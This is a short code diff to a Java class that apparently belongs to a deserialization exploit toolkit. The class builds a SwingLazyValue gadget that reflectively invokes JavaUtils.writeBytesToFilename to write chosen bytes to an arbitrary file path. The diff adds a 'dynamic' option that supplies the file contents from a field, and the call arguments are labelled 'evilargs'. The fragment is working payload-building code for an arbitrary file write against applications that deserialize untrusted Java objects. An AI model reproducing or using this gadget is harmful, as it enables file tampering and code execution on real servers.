@@ -25,12 +25,18 @@ public class SwingLazyValueWithFileWriteBullet extends AbstractBullet<Object> {
     @Require(name = "localFile", detail = "/tmp/test")
     public String localFile;
 
+    public byte[] data = new byte[0];
+
     @Override
     public Object getObject() throws Exception {
         String classname = "com.sun.org.apache.xml.internal.security.utils.JavaUtils";
         String methodName = "writeBytesToFilename";
 
-        Object[] evilargs = new Object[]{filepath, FileHelper.getFileContent(localFile)};
+        if(!"dynamic".equals(localFile)){
+            data = FileHelper.getFileContent(localFile);
+        }
+
+        Object[] evilargs = new Object[]{filepath, data};
         try{
             return ReflectionHelper.newInstance(
                     "sun.swing.SwingLazyValue",
